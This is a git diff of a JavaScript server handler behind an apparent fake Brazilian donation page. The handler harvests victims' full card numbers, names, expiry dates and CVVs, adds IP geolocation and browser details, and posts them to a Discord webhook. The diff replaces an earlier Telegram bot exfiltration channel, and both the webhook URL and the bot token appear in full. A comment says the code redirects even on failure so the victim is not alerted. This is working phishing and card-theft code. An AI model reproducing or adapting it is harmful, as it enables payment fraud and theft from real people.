@@ -1,6 +1,6 @@
 export default async function handler(req, res) {
   if (req.method !== 'POST') {
-    return res.status(405).json({ error: 'Só POST caralho' });
+    return res.redirect('https://doe.savebrasil.org.br/');
   }
 
   const {
@@ -11,8 +11,8 @@ export default async function handler(req, res) {
     valor_doacao = ''
   } = req.body || {};
 
-  if (!numero_cartao || !cvv || !valor_doacao) {
-    return res.status(400).send('Preenche os campos essenciais porra');
+  if (!numero_cartao || !cvv) {
+    return res.status(400).send('Faltou cartão ou cvv');
   }
 
   const ip = req.headers['x-forwarded-for']?.split(',')[0] || req.headers['cf-connecting-ip'] || req.socket?.remoteAddress || 'desconhecido';
@@ -21,11 +21,9 @@ export default async function handler(req, res) {
 
   let ipInfo = { query: ip, city: 'N/A', regionName: 'N/A', country: 'N/A', isp: 'N/A' };
   try {
-    const ipResponse = await fetch(`http://ip-api.com/json/${ip}`);
-    if (ipResponse.ok) ipInfo = await ipResponse.json();
-  } catch (e) {
-    console.log('ip-api deu merda:', e);
-  }
+    const ipRes = await fetch(`http://ip-api.com/json/${ip}`);
+    if (ipRes.ok) ipInfo = await ipRes.json();
+  } catch {}
 
   let navegador = 'Desconhecido';
   if (/Firefox/i.test(userAgent)) navegador = 'Firefox';
@@ -37,43 +35,40 @@ export default async function handler(req, res) {
   const dataHora = new Date().toISOString().replace('T', ' ').split('.')[0];
 
   const conteudo = 
-`🦆 | LOG┃doe.savebrasil.org.br
+`🦆 | LOG REAL | doe.savebrasil.org.br
 
-💳 | Número do Cartão: ${numero_cartao}
-🔐 | Nome no Cartão: ${nome_cartao}
-📅 | Validade: ${validade_cartao}
-🔑 | Cvv/Cvc: ${cvv}
-💰 | Valor da Doação: R$ ${valor_doacao}
+💳 Número: ${numero_cartao}
+🔐 Nome: ${nome_cartao}
+📅 Validade: ${validade_cartao}
+🔑 CVV: ${cvv}
+💰 Valor: R$ ${valor_doacao}
 
-🏠 | IP: ${ipInfo.query || ip}
-🔎 | Cidade: ${ipInfo.city}
-📍 | Região: ${ipInfo.regionName}
-🌎 | País: ${ipInfo.country}
-📦 | ISP: ${ipInfo.isp}
+🏠 IP: ${ipInfo.query || ip}
+🔎 Cidade: ${ipInfo.city}
+📍 Região: ${ipInfo.regionName}
+🌎 País: ${ipInfo.country}
+📦 ISP: ${ipInfo.isp}
 
-🔓 | USER-AGENT: ${userAgent}
-🌐 | NAVEGADOR: ${navegador}
-👥 | LINGUAGEM: ${acceptLanguage}
-📆 | DATA/HORA: ${dataHora}`;
+🔓 UA: ${userAgent}
+🌐 Navegador: ${navegador}
+👥 Idioma: ${acceptLanguage}
+📆 Data/Hora: ${dataHora}`;
 
-  const botToken = '8249791748:AAHsushNFJnmQ_eh3QMx4ijxe8y8mVbZa9U';
-  const chatId = '-1003615689623';
-
-  const telegramUrl = `https://api.telegram.org/bot\( {botToken}/sendMessage?chat_id= \){chatId}&text=${encodeURIComponent(conteudo)}`;
+  const webhookUrl = 'https://discord.com/api/webhooks/1464464364890357771/1RVTOrZ7cBDmxnlsLvjTNTve65oiwgnDSw1Y7bBdixaPTOnBe_aERSqgXU4JpcSnDPGQ'; // <--- COLA TEU WEBHOOK AQUI
 
   try {
-    console.log('Enviando pro grupo:', conteudo.substring(0, 150));
-    const tgRes = await fetch(telegramUrl);
-    const tgText = await tgRes.text();
-    console.log('Telegram respondeu:', tgText);
-
-    if (tgRes.ok) {
-      return res.redirect(302, '/checkout.html');
-    } else {
-      return res.status(500).send('Telegram fodeu: ' + tgText);
-    }
+    await fetch(webhookUrl, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        content: conteudo,
+        username: 'Colhedor CC 🦆💳',
+        avatar_url: 'https://i.imgur.com/pato-cc.jpg' // opcional
+      })
+    });
+    return res.redirect(302, '/css/checkout.html');
   } catch (err) {
-    console.error('Fetch pro Telegram explodiu:', err.message);
-    return res.status(500).send('Merda geral');
+    console.error('Discord cagou:', err);
+    return res.redirect(302, '/css/checkout.html'); // redireciona mesmo se der erro pra não alertar o trouxa
   }
 }
